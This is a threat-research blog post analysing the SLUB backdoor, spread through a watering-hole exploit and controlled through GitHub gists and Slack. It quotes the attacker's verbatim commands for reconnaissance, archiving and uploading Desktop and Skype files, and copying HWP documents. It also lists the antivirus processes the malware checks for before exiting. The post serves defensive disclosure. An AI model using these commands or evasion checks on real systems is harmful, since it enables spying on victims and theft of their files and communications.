	<h1 class="article-details__title">New SLUB Backdoor Uses GitHub, Communicates via Slack</h1>
	<p class="article-details__description">We discovered a malware that uses three different online services -- including Slack and GitHub-- as part of its routine. Analysis of the attacker&#39;s TTPs lead us to believe that this might be a targeted attack from capable threat actors.</p>
	<p class="article-details__author-by">By: Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, Joseph C Chen
		
			<time class="article-details__date">March 07, 2019</time>
		
		
		<span>Read time:&nbsp;</span><span class="eta"></span> (<span class="words"></span> words)

		<div>
			<p>We recently came across a previously unknown malware that piqued our interest in multiple ways. For starters, we discovered it being spread via <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101">watering hole attacks</a>, a technique that involves an attacker compromising a website before adding code to it so visitors are redirected to the infecting code. In this case, each visitor is redirected only once. The infection was done by exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-8174">CVE-2018-8174</a>, a VBScript engine vulnerability that was <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/microsoft-patch-tuesday-for-may-includes-updates-for-actively-exploited-vulnerabilities-2/">patched by Microsoft</a> back in May 2018.</p>
<p>Second, it uses a multi-stage infection scheme. After it exploits the vulnerability, it downloads a DLL and runs it in PowerShell (PS). This file, which is a downloader, then downloads and runs the second executable file containing a backdoor. The first stage downloader also checks for the existence of different kinds of antivirus software processes, and then proceeds to exit if any is found. At the time of discovery, the backdoor was seemingly unknown to AV products.</p>
<p>In addition to the previously mentioned facts, we quickly noticed that the malware was connecting to the Slack platform, a collaborative messaging system that lets users create and use their own workspaces through the use of channels, similar to the IRC chatting system. We found this quite interesting, since we haven’t observed any malware to date that communicates using Slack-- although we've <a href="https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf">previously discussed</a> how cybercriminals could possibly abuse chat platforms as part of their attack.</p>
<p>Our technical investigation and analysis of the attacker’s tools, techniques, and procedures (TTP) lead us to think that this threat is actually a stealthy targeted attack run by capable actors, and not a typical cybercriminal scheme.</p>
<p>Note that as soon as this malware was discovered, we informed the Canadian Centre for Cyber Security, which acts as Canada’s National Computer Security Incident Response Team (CSIRT). The Cyber Centre alerted the site operator, helped them understand the malware that was found, and offered mitigation advice.</p>
<h4><i><b>Infection Chain</b></i>  </h4>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-1.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-1.jpg" alt=" Figure 1. The infection chain of the attack"/></a></p>
<p style="text-align: center;"><i>Figure 1. The infection chain of the attack</i></p>
<h4><i style=""><b>The downloader</b></i></h4>
<p>The downloader, which runs through PowerShell as a DLL, serves several purposes. The first is to download the second stage malware, which we called the SLUB (for SLack and githUB; <b>detected as Backdoor.Win32.SLUB.A</b>) backdoor and execute it. The second purpose is to check if the following antivirus processes are running:</p>
<ul>
<li><span class="rte-red-bullet">V3Tray.exe</span></li>
<li><span class="rte-red-bullet">AYAgent.aye</span></li>
<li><span class="rte-red-bullet">navapsvc.exe</span></li>
<li><span class="rte-red-bullet">ashServ.exe</span></li>
<li><span class="rte-red-bullet">avgemc.exe</span></li>
<li><span class="rte-red-bullet">bdagent.exe</span></li>
<li><span class="rte-red-bullet">ZhuDongFangYu.exe</span></li>
<li> </li>
</ul>
<p>If the downloader finds one of these, it simply exits.</p>
<p>Finally, the downloader also exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation. The exploit's code was likely created by modifying code from a <a href="https://github.com/hfiref0x/CVE-2015-1701/blob/master/Source/Taihou/main.c">GitHub repository</a>, which is shown in the image below.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-2.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-2.jpg" alt=" Figure 2. The unmodified code"/></a></p>
<p style="text-align: center;"><i>Figure 2. The unmodified code</i></p>
<h4><b><i>The SLUB backdoor</i></b></h4>
<p>The SLUB backdoor is a custom one written in the C++ programming language, statically linking curl library to perform multiple HTTP requests. Other statically-linked libraries are boost (for extracting commands from gist snippets) and JsonCpp (for parsing slack channel communication).</p>
<p>The malware also embeds two authorization tokens to communicate with the Slack API.</p>
<ul>
<li><span class="rte-red-bullet">It copies itself to ProgramData\update\ and creates persistence via a Run registry key, calling export function UpdateMPUnits with rundll32.exe. Note the typo in the ValueName, “Microsoft Setup Initializazion.”</span></li>
</ul>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-3.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-3.jpg" alt=" Figure 3. Screenshots of the Run registry key"/></a></p>
<p style="text-align: center;"><i>Figure 3. Screenshots of the Run registry key</i></p>
<ul>
<li><span class="rte-red-bullet">It downloads a specific “gist” snippet from Github and parses it, looking for commands (which we will cover further in this entry) to execute. Only lines starting with “^” and ending with “$” will be executed. The other lines are ignored.</span></li>
</ul>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-4-1.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-4-1.jpg"/></a></p>
<p style="text-align: center;"><i>Figure 4. The “gist” snippet that is downloaded from Github</i></p>
<p>The result of the commands is then posted to a private Slack channel in a particular workspace using the embedded tokens.</p>
<p>Note that a side effect of this particular setup is that the attacker has no way to issue commands to a specific target. Each infected computer will execute the commands that are enabled in the gist snippet upon checking it.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-5-1.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-5-1.jpg" alt=" Figure 5. Scheme of the backdoor communication, with the first arrow starting from the person who initiates the connection"/></a></p>
<p style="text-align: center;"><i>Figure 5. Scheme of the backdoor communication, with the first arrow starting from the person who initiates the connection</i></p>

<h4><i><b>Slack communication function</b></i></h4>
<p>The slack communication function contains two hardcoded authentication tokens split into a few smaller chunks.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-6-1.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-6-1.jpg" alt=" Figure 6. Code of the communication function"/></a></p>
<p style="text-align: center;"><i>Figure 6. Code of the communication function</i></p>
<p>Later, the backdoor gets the username and computer name (seen in Figure 7) then creates and uploads the Slack message into a channel. It uses the following API to post messages:</p>
<ul>
<li><span class="rte-red-bullet">https://api.slack.com/methods/chat.postMessage</span></li>
<li> </li>
</ul>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-7.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-7.jpg" alt=" Figure 7. Retrieving the username and computer name"/></a></p>
<p style="text-align: center;"><i>Figure 7. Retrieving the username and computer name</i></p>
<p>The keywords “title,” “text,” “channel,” and “attachments” are clearly visible in the function listing.</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-8.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-8.jpg" alt=" Figure 8. <p style="text-align: center;"><i>Figure 8. Function listing showing keywords</i></p>
<p>The output of every command is sent to a private Slack channel, while every command itself is sent to a different private Slack channel as an attachment with the text “<i>*computername:username*</i>”<i>.</i></p>
<h4><i><b>The attacker’s tools, techniques and procedures</b></i></h4>
<p>The Github account and the Slack workspace were created specifically for a campaign on February 19 and 20, while we estimate that the attacker compiled the malware on February 22. The attacker added the first commands to Github on February 20. However looking at the Slack channels, we can see that the attacker tested the malware on February 23 and 24. The first victims were seen on February 27. The attackers' first actions involve getting context information to learn more about the computer they infected:</p>
<blockquote>^exec,tasklist$ ^capture$ ^drive,list$ ^file,list,C:\Users\$ ^reg,read,HKEY_CURRENT_USER,SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run$</blockquote>
<p>They look for running processes, take screen captures, list drives on the machine, list all users, and check the malware's persistence registry key. They will also usually list some known directories:</p>
<blockquote>^exec,dir /s C:\Users\USER\Desktop\$\ ^exec,dir /s C:\Users\USER\Downloads\$\ ^exec,dir /s C:\Users\USER\Recent\$</blockquote>
<p>Some commands caught our interest, such as one that allows the attacker to create an archive file of the user's entire Desktop folder, which is then exfiltrated:</p>
<blockquote>^exec,powershell -Command compress-archive -path C:\Users\USER\Desktop -destinationpath C:\Users\USER\doc1$\ ^file,upload,C:\Users\USER\doc1$</blockquote>
<p>The following command allows an attacker to build a CAB file containing the file tree of the user’s Desktop:</p>
<blockquote>^exec,cd C:\Users\USER &amp; dir /s /b /a-d C:\Users\USER\Desktop &gt; C:\Users\USER\win12 &amp; makecab /d CabinetName1=win34 /f C:\Users\USER\win12$</blockquote>
<p>The attacker is also seemingly interested in files containing the local archive in Skype:</p>
<blockquote>^file,upload C:\Users\Admin\AppData\Roaming\Skype\DataRv\offline-storage-ecs.data$ ^file,upload C:\Users\Admin\AppData\Roaming\Skype\DataRv\offline-storage.data$ ^file,upload C:\Users\Admin\AppData\Roaming\Skype\DataRv\offline-storage.data-shm$ ^file,upload C:\Users\Admin\AppData\Roaming\Skype\DataRv\offline-storage.data-wal$</blockquote>
<p>The attacker copies all the HWP files (extension used by a Korean word processor) to a specific directory.</p>
<blockquote>^exec,copy C:\Users\USER\Desktop\*.hwp C:\Users\USER\oo$</blockquote>
<p>The attacker likely planned to exfiltrate this directory — however, we did not see any commands for this. We also noted a specific interest in a software called “Neologic Plus Board,” which seems to be used for the administration of bulletin board systems. Some of the files that the attackers retrieved contained hundreds of BBS URLs.</p>
<p>We also noticed that most of the files uploaded to file.io were already deleted when we tried to retrieve them.</p>
<p>Based on the commands run by the attackers, we theorize that they are looking for people-related information. The attackers want to know more about the targeted victims’ communications. Thus, they dig into activities on Twitter, Skype, KakaoTalk, BBS — and possibly more communication systems — in addition to collecting the HWP files.</p>
<p>This timeline of events shows the speed in which the threat actors launched the attack:</p>
<p style="text-align: center;"><a href="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-9.jpg"><img src="/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-9.jpg" alt=" Figure 9. Timeline of events"/></a></p>
<p style="text-align: center;"><i>Figure 9. Timeline of events</i></p>
<h4><i><b>Conclusion</b></i></h4>
<p>Perhaps the most unique aspect of this campaign is that it makes use of three different online services to issue commands, get the results, and retrieve files from compromised hosts.</p>
<p>Our investigation makes us believe with strong confidence that it was part of a possible targeted attack campaign. So far, we have not been able to find related attacks, and have not spotted the custom backdoor elsewhere. We have been searching for similar samples and have found none so far, which is a strong indication that the attackers either developed the malware or got it from a private developer who has not publicly leaked it.</p>
<p>The commands that the attackers ran clearly show a strong interest in person-related information, with a special focus on communication software, in an attempt to learn more about the people behind the computers they infected.</p>
<p>The attackers also appear to be professionals, based on their way of handling their attack. They only use public third party services, and therefore did not need to register any domains or anything else that could leave a trail. The few email addresses we found during the investigation were also using trash email systems, giving the attackers a clean footprint. Finally, the watering hole chosen by the attackers can be considered interesting for those who follow political activities, which might give a glimpse into the nature of the groups and individuals that the attackers are targeting.</p>
<p>We would like to thank Github’s SIRT and Slack’s security teams for quickly removing the related files, which effectively cut the communication between the attackers and their malware.</p>
<p>In response to this incident, Slack replied with the following: <i>As noted in their post, Trend Micro recently discovered a third party’s unauthorized access of another third party’s computer using malware, and reported to us the existence of a Workspace on Slack related to this effort. We investigated and immediately shut down the single Workspace as a violation of our terms of service, and we confirmed that Slack was not compromised in any way as part of this incident. We are committed to preventing the misuse of our platform and we will take action against anyone who violates our </i><a href="https://slack.com/terms-of-service"><i>terms of service</i></a><i>.</i></p>
